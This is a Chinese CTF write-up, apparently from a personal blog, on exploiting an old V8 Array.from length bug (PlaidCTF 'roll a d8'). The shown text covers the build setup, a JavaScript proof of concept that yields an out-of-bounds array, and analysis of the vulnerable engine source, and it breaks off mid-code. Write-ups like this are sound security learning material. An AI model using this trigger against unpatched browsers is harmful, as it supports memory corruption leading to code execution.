<!-- build time:Tue Jun 25 2019 02:57:49 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="v8 exploit入门[PlaidCTF roll a d8]"><meta name="keywords" content="v8,OOB"><meta name="author" content="Hpasserby"><meta name="copyright" content="Hpasserby"><title>v8 exploit入门[PlaidCTF roll a d8] | Hpasserby</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?4e3b4e0b100ec31631e29622d1ef8014";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>!function(e,t,a,n,c,s,o){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,s=t.createElement(a),o=t.getElementsByTagName(a)[0],s.async=1,s.src=n,o.parentNode.insertBefore(s,o)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-136221440-1","auto"),ga("send","pageview")</script><link rel="dns-prefetch" href="http://ta.qq.com"><script>!function(){var t=document.createElement("script");t.src="https://tajs.qq.com/stats?sId=66194231";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()</script><script>var GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容:${query}"}},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"}}</script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#调试环境"><span class="toc-number">1.</span> <span class="toc-text">调试环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#v8调试环境搭建"><span class="toc-number">1.1.</span> <span class="toc-text">v8调试环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译"><span class="toc-number">1.2.</span> <span class="toc-text">编译</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析与调试技巧"><span class="toc-number">2.</span> <span class="toc-text">分析与调试技巧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC分析"><span class="toc-number">3.1.</span> <span class="toc-text">POC分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#源码分析"><span class="toc-number">3.2.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CodeStubAssembler简介"><span class="toc-number">3.2.1.</span> <span class="toc-text">CodeStubAssembler简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码逻辑"><span class="toc-number">3.2.2.</span> <span class="toc-text">漏洞代码逻辑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理总结"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞原理总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#V8内存模型"><span class="toc-number">4.1.</span> <span class="toc-text">V8内存模型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tagged-Value"><span class="toc-number">4.1.1.</span> <span class="toc-text">Tagged Value</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsObject"><span class="toc-number">4.1.2.</span> <span class="toc-text">JsObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ArrayBuffer-amp-amp-TypedArray"><span class="toc-number">4.1.3.</span> <span class="toc-text">ArrayBuffer &amp;&amp; TypedArray</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsFunction"><span class="toc-number">4.1.4.</span> <span class="toc-text">JsFunction</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#自制类型转换小工具"><span class="toc-number">4.2.</span> <span class="toc-text">自制类型转换小工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#任意读写能力"><span class="toc-number">4.3.</span> <span class="toc-text">任意读写能力</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息泄露"><span class="toc-number">4.4.</span> <span class="toc-text">信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#泄露堆地址"><span class="toc-number">4.4.1.</span> <span class="toc-text">泄露堆地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#泄露libc基址"><span class="toc-number">4.4.2.</span> <span class="toc-text">泄露libc基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#泄露栈地址"><span class="toc-number">4.4.3.</span> <span class="toc-text">泄露栈地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#布置shellcode"><span class="toc-number">4.5.</span> <span class="toc-text">布置shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">4.6.</span> <span class="toc-text">ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整利用"><span class="toc-number">4.7.</span> <span class="toc-text">完整利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">6.</span> <span class="toc-text">参考资料</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#v8基础"><span class="toc-number">6.1.</span> <span class="toc-text">v8基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#v8利用"><span class="toc-number">6.2.</span> <span class="toc-text">v8利用</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/images/avatar.jpg"></div><div class="author-info__name text-center">Hpasserby</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Hpasserby/Hpasserby.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">17</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">5</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友情链接</div><a class="author-info-links__name text-center" href="https://www.redog.me/">wjllz师傅的blog</a><a class="author-info-links__name text-center" href="http://www.sunyq.xin/">sunyq大佬的blog</a><a class="author-info-links__name text-center" href="https://hachp1.github.io/">HACHp1大佬的机器学习</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image:url(/images/head.jpg)"><div id="page-header"><span class="pull-left"><a id="site-name" href="/">Hpasserby</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于</a></span></div><div id="post-info"><div id="post-title">v8 exploit入门[PlaidCTF roll a d8]</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-05-22</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/浏览器/">浏览器</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><blockquote><p>本文首发于先知社区 <a href="https://xz.aliyun.com/t/5190" target="_blank" rel="noopener">https://xz.aliyun.com/t/5190</a></p></blockquote><blockquote><p>这篇博客3月份一直拖到现在才写完2333，太水了<br>一直想要入门chrome漏洞挖掘，于是就打算从一道<a href="https://ctftime.org/task/6081" target="_blank" rel="noopener">CTF题目</a>入手（其实也是一个真实的漏洞），这篇文章记录了我的学习过程，是一个总结，也希望能帮到同样在入门的朋友。</p></blockquote><a id="more"></a><h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul><li>Ubuntu16.04 x64</li><li><a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">pwndbg</a></li></ul><h2 id="v8调试环境搭建"><a href="#v8调试环境搭建" class="headerlink" title="v8调试环境搭建"></a>v8调试环境搭建</h2><ul><li>这里主要参考了sakura师傅的教程<ul><li><a href="http://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/05/06/v8/</a></li></ul></li><li>以及最重要的一点，挂代理，这里我使用的是<code>polipo</code><ul><li><a href="http://couplee.wang/wnagzihxa1n/BrowserSecurity/Ubuntu_16.04_x64%E7%BC%96%E8%AF%91V8%E6%BA%90%E7%A0%81/article.html" target="_blank" rel="noopener">http://couplee.wang/wnagzihxa1n/BrowserSecurity/Ubuntu_16.04_x64%E7%BC%96%E8%AF%91V8%E6%BA%90%E7%A0%81/article.html</a></li></ul></li></ul><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>首先进入题目所给出的<a href="https://crbug.com/821137" target="_blank" rel="noopener">链接</a>，找到修复bug的commit。<br><img src="/post/abaa2e35/bugs.png" alt="bugs.png"><br>然后可以找到包含漏洞的版本hash值和一个poc文件<br><img src="/post/abaa2e35/git.png" alt="git.png"><br>然后通过parent的hash值回退到漏洞版本，并进行编译（debug模式）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/v8gen.py x64.debug </span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure><p>relase模式编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tools/dev/v8gen.py x64.relase</span><br><span class="line">ninja -C out.gn/x64.relase d8</span><br></pre></td></tr></table></figure><h1 id="分析与调试技巧"><a href="#分析与调试技巧" class="headerlink" title="分析与调试技巧"></a>分析与调试技巧</h1><blockquote><p>这里先简单介绍一下我学习过程中用到的调试方法。</p></blockquote><ol><li><p>%DebugPrint()<br>这是一个极其常用的函数，可以通过该函数打印出对象的详细信息，如内存地址、属性、map等。运行时使用参数<code>--allow-natives-syntax</code><br>如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line">%DebugPrint(arr);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 --allow-natives-syntax ./test.js</span><br></pre></td></tr></table></figure></li><li><p>DebugBreak()<br>当分析v8源码时，遇到<code>CodeStubAssembler</code>编写的代码，可以在其中插入<code>DebugBreak();</code>，这相当于插入了一个断点(类似<code>int 3</code>)，重新编译后使用调试器调试时，可以在插入处断下。</p></li><li><p>Print()<br>同样，遇到<code>CodeStubAssembler</code>编写的代码时，可以使用它来输出一些变量值，函数原型是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CodeStubAssembler::Print(<span class="keyword">const</span> <span class="keyword">char</span>* prefix, Node* tagged_value)</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二个参数是Node*型，可能需要强转</span></span><br><span class="line">Print(<span class="string">"array"</span>, <span class="keyword">static_cast</span>&lt;Node*&gt;(<span class="built_in">array</span>.value()));</span><br></pre></td></tr></table></figure><p>重新编译后即可。</p></li><li><p>readline()<br>可以添加在js代码中，让程序停下来等待输入，方便使用gdb断下进行调试。该方法比写一个while死循环好在，让程序停下后，还可以让程序继续运行下去。</p></li><li><p>V8自带gdb调试命令<br>在/tools/目录下，可以找到gdbinit和gdb-v8-support.py。我将gdb-v8-support.py复制到了根目录下，然后修改自己的.gdbinit文件，将提供的gdbinit都复制过来。<br><img src="/post/abaa2e35/v8tools.png" alt="v8tools.png"><br>就可以在gdb中使用v8自带调试命令了<br>具体命令可以在gdbinit中自己查阅，注释还是很友好的。我最常用的就是job。</p></li><li><p><a href="https://github.com/inexorabletash/polyfill" target="_blank" rel="noopener">polyfill</a><br>因为我没有系统学过js开发，不是太清楚ployfill在实际开发时的作用（似乎是用来补充一些浏览器缺少的api）。但是在学习v8的过程中对我有极大的帮助，在<code>ployfill</code>中使用js自身实现了许多js的原生函数，这意味着，在调试js原生函数的时候可以通过查看<code>polyfill</code>来了解函数实现细节。而且经过和v8中使用<code>CodeStubAssembler</code>实现的原生函数，可以发现实现逻辑基本一致。</p></li></ol><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [];</span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">        oobArray.length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">oobArray[oobArray.length - <span class="number">1</span>] = <span class="number">0x41414141</span>;</span><br></pre></td></tr></table></figure><p>运行该poc，触发crash（注意使用debug编译的d8）<br><img src="/post/abaa2e35/crash.png" alt="crash.png"><br>简单的分析该<code>poc</code><br>首先创建了一个数组oobArray<br>然后将<code>function() { return oobArray }</code>作为<code>this</code>参数传入<code>Array.from.call</code>。</p><p>此处，我查阅了pollyfill中对<code>Array.from</code>的实现（这里对Array.from的分析其实是在下文分析漏洞时进行的，但为了描述的方便，先写在此处）<br><img src="/post/abaa2e35/polyfill1.png" alt="plooyfill1.png"><br>因为这里<code>Array.from.call</code>的this参数是一个函数，所以会调用<code>var a = new c()</code><br>查询javascript中<code>new关键字</code>的返回值可知，当使用new关键字调用一个函数时，若函数返回一个非原始变量（如像object、array或function），那么这些返回值将取代原本应该返回的this实例。<br>这意味着这里调用<code>c()</code>会返回<code>oobArray</code>，并且此后的操作都将直接修改<code>oobArray</code>。</p><p>回到<code>poc</code>中，在<code>iterator</code>中可以看到，在最后一次迭代时，将<code>oobArray</code>的长度修改为<code>0</code>。<br>最后的赋值语句触发crash</p><p>通过poc可以猜测，可能是最后一次迭代时对<code>oobArray.length</code>的赋值时出现了bug, 导致最后<code>oobArray</code>实际长度与<code>length的值</code>的不同，造成越界访问。<br>下面进行详细的分析。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先从<code>diff</code>入手，看看如何修复的该漏洞<br><img src="/post/abaa2e35/diff.png" alt="diff.png"><br>注意到这里只修改了<code>GenerateSetLength</code>函数中的一个跳转语句，将<code>LessThan</code>修改为<code>NotEqual</code>，这说明极有可能是在<code>length_smi &gt; old_length</code>时的处理出现了问题。但仍需进一步分析。</p><h3 id="CodeStubAssembler简介"><a href="#CodeStubAssembler简介" class="headerlink" title="CodeStubAssembler简介"></a>CodeStubAssembler简介</h3><p>这里分析将涉及到CodeStubAssembler代码，这里先简单介绍一下。</p><blockquote><p>v8为了提高效率，采用了CodeStubAssembler来编写js的原生函数，它是是一个定制的，与平台无关的汇编程序，它提供低级原语作为汇编的精简抽象，但也提供了一个扩展的高级功能库。</p></blockquote><p>这里我简单记录其中几个的语法，一些是我自己推测理解的，仅供参考。。</p><ul><li>TF_BUILTIN：创建一个函数</li><li>Label：用于定义将要用到的标签名，这些标签名将作为跳转的目标</li><li>BIND：用于绑定一个标签，作为跳转的目标</li><li>Branch：条件跳转指令</li><li>VARIABLE：定义一些变量</li><li>Goto：跳转</li></ul><h3 id="漏洞代码逻辑"><a href="#漏洞代码逻辑" class="headerlink" title="漏洞代码逻辑"></a>漏洞代码逻辑</h3><blockquote><p>建议使用IDE之类来查看代码，方便搜索和跳转。<br>首先查看<code>GenerateSetLength</code>函数</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GenerateSetLength</span><span class="params">(TNode&lt;Context&gt; context, TNode&lt;Object&gt; <span class="built_in">array</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                         TNode&lt;Number&gt; length)</span> </span>&#123;</span><br><span class="line">    Label fast(this), runtime(this), done(this);</span><br><span class="line">    <span class="comment">// Only set the length in this stub if</span></span><br><span class="line">    <span class="comment">// 1) the array has fast elements,</span></span><br><span class="line">    <span class="comment">// 2) the length is writable,</span></span><br><span class="line">    <span class="comment">// 3) the new length is greater than or equal to the old length.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) Check that the array has fast elements.</span></span><br><span class="line">    <span class="comment">// TODO(delphick): Consider changing this since it does an an unnecessary</span></span><br><span class="line">    <span class="comment">// check for SMIs.</span></span><br><span class="line">    <span class="comment">// TODO(delphick): Also we could hoist this to after the array construction</span></span><br><span class="line">    <span class="comment">// and copy the args into array in the same way as the Array constructor.</span></span><br><span class="line">    BranchIfFastJSArray(<span class="built_in">array</span>, context, &amp;fast, &amp;runtime);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;fast);</span><br><span class="line">    &#123;</span><br><span class="line">      TNode&lt;JSArray&gt; fast_array = CAST(<span class="built_in">array</span>);</span><br><span class="line">     </span><br><span class="line">      TNode&lt;Smi&gt; length_smi = CAST(length);</span><br><span class="line">    </span><br><span class="line">      TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array);</span><br><span class="line">      CSA_ASSERT(<span class="keyword">this</span>, TaggedIsPositiveSmi(old_length));</span><br><span class="line"></span><br><span class="line">      EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 3) If the created array already has a length greater than required,</span></span><br><span class="line">      <span class="comment">//    then use the runtime to set the property as that will insert holes</span></span><br><span class="line">      <span class="comment">//    into the excess elements and/or shrink the backing store.</span></span><br><span class="line">      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line"></span><br><span class="line">      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                     length_smi);</span><br><span class="line">      Goto(&amp;done);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;runtime);</span><br><span class="line">    &#123;</span><br><span class="line">      CallRuntime(Runtime::kSetProperty, context, <span class="keyword">static_cast</span>&lt;Node*&gt;(<span class="built_in">array</span>),</span><br><span class="line">                  CodeStubAssembler::LengthStringConstant(), length,</span><br><span class="line">                  SmiConstant(LanguageMode::kStrict));</span><br><span class="line">      Goto(&amp;done);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;done);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先判断是否具有<a href="https://v8.dev/blog/fast-properties" target="_blank" rel="noopener">fast element</a>，这里poc代码执行时会进入<code>&amp;fast</code>分支</p><p>随后若<code>length_smi &lt; old_length</code>，就跳转到<code>&amp;runtime</code>，否则执行<code>StoreObjectFieldNoWriteBarrier</code></p><p>根据源码注释可以知道，<code>&amp;runtime</code>会进行内存的缩减<br>而分析<code>StoreObjectFieldNoWriteBarrier</code>函数，这应该是一个赋值函数，将<code>array</code>的<code>length属性值</code>修改为<code>length_smi</code></p><p>前面我们猜测是<code>length_smi &gt; old_length</code>时出现问题，通过这里的分析，漏洞根源似乎更明了了。<br>当<code>length_smi &gt; old_length</code>，程序不会执行<code>&amp;runtime</code>去进行缩减内存等操作，而是会直接修改length的值。那么可以猜测是将较大的<code>length_smi</code>写入了数组的<code>length</code>，导致数组的长度属性值大于了实际长度，造成了越界访问。</p><p>看到这里，感觉仍然没有完全分析透彻，不知道函数各个参数的具体来源都是什么，也不知道为什么<code>length_smi</code>会大于<code>old_length</code>。</p><p>于是尝试寻找调用该函数的上层函数，搜索后定位到了<code>TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)</code>，代码比较长，不过还是得慢慢看。<br>(之所以确定这个函数，是因为poc中确实正好调用了<code>Array.from</code>)<br><img src="/post/abaa2e35/search.png" alt="search.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES #sec-array.from</span></span><br><span class="line">TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  TNode&lt;JSReceiver&gt; array_like = ToObject(context, items);</span><br><span class="line"></span><br><span class="line">  TVARIABLE(Object, <span class="built_in">array</span>);</span><br><span class="line">  TVARIABLE(Number, length);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Determine whether items[Symbol.iterator] is defined:</span></span><br><span class="line">  IteratorBuiltinsAssembler iterator_assembler(state());</span><br><span class="line">  Node* iterator_method =</span><br><span class="line">      iterator_assembler.GetIteratorMethod(context, array_like);</span><br><span class="line">  Branch(IsNullOrUndefined(iterator_method), &amp;not_iterable, &amp;iterable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果可以迭代</span></span><br><span class="line">  BIND(&amp;iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 返回一个数组，用于存储迭代后得到的结果</span></span><br><span class="line">    <span class="comment">// Construct the output array with empty length.</span></span><br><span class="line">    <span class="built_in">array</span> = ConstructArrayLike(context, args.GetReceiver());</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    Goto(&amp;loop);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//开始迭代</span></span><br><span class="line">    BIND(&amp;loop);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 判断迭代是否结束</span></span><br><span class="line">      <span class="comment">// Loop while iterator is not done.</span></span><br><span class="line">      TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep(</span><br><span class="line">          context, iterator_record, &amp;loop_done, fast_iterator_result_map));</span><br><span class="line">      TVARIABLE(Object, value,</span><br><span class="line">                CAST(iterator_assembler.IteratorValue(</span><br><span class="line">                    context, next, fast_iterator_result_map)));</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">// 将得到的结果存入array</span></span><br><span class="line">      <span class="comment">// Store the result in the output object (catching any exceptions so the</span></span><br><span class="line">      <span class="comment">// iterator can be closed).</span></span><br><span class="line">      Node* define_status =</span><br><span class="line">          CallRuntime(Runtime::kCreateDataProperty, context, <span class="built_in">array</span>.value(),</span><br><span class="line">                      index.value(), value.value());</span><br><span class="line">      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 索引加1</span></span><br><span class="line">      index = NumberInc(index.value());</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//迭代结束</span></span><br><span class="line">    BIND(&amp;loop_done);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//将迭代次数赋值给length变量</span></span><br><span class="line">      length = index;</span><br><span class="line">      Goto(&amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  BIND(&amp;finished);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用GenerateSetLength，将array和迭代次数作为参数</span></span><br><span class="line">  <span class="comment">// Finally set the length on the output and return it.</span></span><br><span class="line">  GenerateSetLength(context, <span class="built_in">array</span>.value(), length.value());</span><br><span class="line">  args.PopAndReturn(<span class="built_in">array</span>.value());</span><br><span 